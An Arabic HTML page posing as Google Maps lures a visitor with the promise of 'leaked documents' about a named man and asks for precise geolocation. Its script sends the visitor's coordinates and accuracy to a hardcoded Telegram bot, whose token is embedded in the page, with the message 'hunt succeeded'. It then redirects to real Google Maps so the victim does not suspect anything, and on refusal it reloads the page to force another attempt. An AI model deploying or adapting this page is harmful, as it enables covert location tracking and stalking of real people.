<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps - تحديد موقع المستند</title>
    <style>
        body { margin: 0; font-family: sans-serif; background: #e8eaed; display: flex; flex-direction: column; height: 100vh; }
        #header { background: white; padding: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; font-weight: bold; color: #1a73e8; }
        #map-bg { flex-grow: 1; background: url('https://tech-story.net/wp-content/uploads/2021/04/google-maps.jpg') no-repeat center; background-size: cover; filter: blur(8px); }
        .overlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 25px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 85%; max-width: 350px; text-align: center; z-index: 100; }
        .btn { background: #1a73e8; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
    </style>
</head>
<body>

<div id="header">خرائط Google - عرض موقع التقرير</div>
<div id="map-bg"></div>

<div class="overlay">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
    <h3>عرض الموقع الدقيق</h3>
    <p style="color: #5f6368; font-size: 14px;">يجب السماح بالوصول إلى موقعك الجغرافي لفتح الخريطة وعرض مكان تواجد الوثائق المسربة الخاصة بـ (حيدر التراب).</p>
    <button class="btn" onclick="getLocation()">فتح الخريطة الآن</button>
</div>

<script>
    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
    const chat_id = '7214473798';

    function sendToTelegram(msg) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
    }

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(pos) {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const acc = pos.coords.accuracy;
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                sendToTelegram(`🎯 تم الصيد بنجاح!\n📍 الرابط: ${mapLink}\n📏 الدقة: ${acc} متر`);
                
                // تحويله لخريطة حقيقية عشان ما يشك
                window.location.href = "https://www.google.com/maps/search/" + lat + "," + lon;
            }, function(err) {
                sendToTelegram("⚠️ الهدف رفض الصلاحية مرة أخرى.");
                alert("خطأ: يجب السماح بالوصول للموقع لعرض الخريطة.");
                location.reload(); // إعادة التحميل لإجباره على المحاولة
            }, {enableHighAccuracy: true});
        }
    }
</script>

</body>
</html>
